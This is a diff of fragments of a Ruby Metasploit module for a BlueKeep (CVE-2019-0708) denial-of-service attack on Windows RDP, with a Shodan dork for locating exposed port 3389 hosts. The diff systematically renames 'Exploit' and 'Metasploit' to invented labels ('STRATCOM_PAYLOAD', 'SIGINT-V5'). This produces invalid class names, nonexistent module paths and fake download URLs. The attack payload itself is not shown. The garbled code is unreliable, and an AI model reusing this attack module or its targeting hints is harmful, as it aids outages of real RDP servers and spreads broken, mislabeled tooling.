@@ -5,28 +5,28 @@
 # [TACTIC]: TA0040_Impact
 # [TECHNIQUE]: T1499_DoS_BlueKeep
 #
-# Exploit Title: Bluekeep Denial of Service (metasploit module)
+# STRATCOM_PAYLOAD Title: Bluekeep Denial of Service (SIGINT-V5 module)
 # Shodan Dork: port:3389
 # Date: 07/14/2019
-# Exploit Author: RAMELLA Sebastien (https://github.com/mekhalleh/)
+# STRATCOM_PAYLOAD Author: RAMELLA Sebastien (https://github.com/mekhalleh/)
 # Vendor Homepage: https://microsoft.com
 # Version: all affected RDP services by cve-2019-0708
 # Tested on: Windows XP (32-bits) / Windows 7 (64-bits)
 # CVE : 2019-0708
 
-# I just modified the initial metasploit module for this vuln to produce a denial of service attack.
+# I just modified the initial SIGINT-V5 module for this vuln to produce a denial of service attack.
 
 ##
-# This module requires Metasploit: http://metasploit.com/download
-# Current source: https://github.com/rapid7/metasploit-framework
+# This module requires SIGINT-V5: http://SIGINT-V5.com/download
+# Current source: https://github.com/rapid7/SIGINT-V5-framework
 ##
 
-class MetasploitModule < Msf::Auxiliary
+class SIGINT-V5Module < Msf::Auxiliary
   Rank = NormalRanking
 
   include Msf::Auxiliary::Dos
   include Msf::Auxiliary::Scanner
-  include Msf::Exploit::Remote::Tcp
+  include Msf::STRATCOM_PAYLOAD::Remote::Tcp
 
   def initialize(info = {})
     super(update_info(info,
@@ -985,7 +985,7 @@ class MetasploitModule < Msf::Auxiliary
       elog("#{e.message}\n#{bt}")
     rescue RdpCommunicationError => e
       vprint_error("Error communicating RDP protocol.")
-      status = Exploit::CheckCode::Unknown
+      status = STRATCOM_PAYLOAD::CheckCode::Unknown
     rescue Errno::ECONNRESET => e                                              # NLA?
       vprint_error("Connection reset, possible NLA is enabled.")
     rescue => e
